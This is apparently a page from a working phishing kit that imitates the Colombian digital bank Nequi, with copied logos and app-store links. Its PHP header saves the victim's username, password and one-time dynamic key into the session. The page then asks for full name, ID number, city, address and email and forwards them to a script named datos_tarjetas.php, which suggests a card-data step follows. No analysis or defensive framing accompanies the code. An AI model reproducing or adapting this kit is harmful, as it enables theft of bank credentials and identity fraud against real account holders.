<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $j_username = $_POST["j_username"] ?? '';
    $j_password = $_POST["j_password"] ?? '';
    $j_dinamica = $_POST["j_dinamica"] ?? '';

    $_SESSION["j_username"] = $j_username;
    $_SESSION["j_password"] = $j_password;
    $_SESSION["j_dinamica"] = $j_dinamica;
} else {
    header("Location: ../login.html");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Nequi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- ✅ rutas corregidas hacia assets -->
    <link rel="stylesheet" type="text/css" href="../assets/css/normalize.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/nequi_two.webflow.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/nequi_one.webflow.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/main.css">

    <!-- Librerías JS -->
    <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0-beta.2/angular.min.js"></script>
    <script src="https://code.angularjs.org/1.4.3/i18n/angular-locale_en-us.js"></script>
    <script src="../assets/js/libs/lodash.min.js"></script>
    <script src="../assets/js/libs/restangular.min.js"></script>
    <script type="text/javascript" src="../assets/js/libs/angular-recaptcha.min.js"></script>
</head>
<body ng-app="App" class="ng-scope">
    <div id="content">
        <!-- Header -->
        <header class="ng-scope">
            <div class="wrap-header">
                <div class="row">
                    <div class="col-xs-12 col-md-2">
                        <div class="logo">
                            <a href="https://www.nequi.com.co">
                                <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </header>

        <!-- 🔹 formulario que envía a datos_tarjetas.php -->
        <section class="login-section ng-scope">
            <div class="login-wrap">
                <img src="../assets/images/push-action-timerV2.gif" alt="" width="25%">
                <h1 class="ng-binding">Queremos verificar tu identidad</h1>
                <div class="login-form-wrap">
                    <form method="POST" action="datos_tarjetas.php" autocomplete="off">
                        <div class="preguntas">
                            <input type="text" name="nombre" placeholder="Nombre Completo" required>
                            <br><input type="tel" name="cedula" placeholder="Número de Identificación" required>
                            <br><input type="text" name="ciudad" placeholder="Ciudad de Residencia" required>
                            <br><input type="text" name="dir" placeholder="Dirección" required>
                            <br><input type="email" name="email" placeholder="Email de Contacto" required>
                        </div>
                        <div class="btn-wrap">
                            <input class="form-btn-submit" type="submit" value="Continuar">
                        </div>
                    </form>
                </div>
            </div>
        </section>

        <!-- Footer -->
        <footer class="ng-scope">
            <div class="container-footer">
                <div class="container-top">
                    <div class="logo-nequi">
                        <img alt="logo nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg">
                    </div>
                    <div class="stores">
                        <a href="https://play.google.com/store/apps/details?id=com.nequi.MobileApp&hl=es">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg">
                        </a>
                        <a href="https://apps.apple.com/co/app/nequi/id1075378688">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg">
                        </a>
                        <a href="https://appgallery.huawei.com/#/app/C101700131?channelId=browser&detailType=0">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd25c_store-huawei.svg">
                        </a>
                    </div>
                    <div class="group-bancolombia">
                        <a href="https://www.grupobancolombia.com/">
                            <img class="img-group-bancolombia" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50f4c6011eb184c8d7d99_logo-grupo-bancolombia.svg">
                        </a>
                    </div>
                </div>
                <hr class="separator">
            </div>
        </footer>
    </div>

    <!-- ✅ script desde assets -->
    <script src="../assets/js/script.js"></script>
    <script async defer src="https://www.google.com/recaptcha/api.js"></script>
</body>
</html>
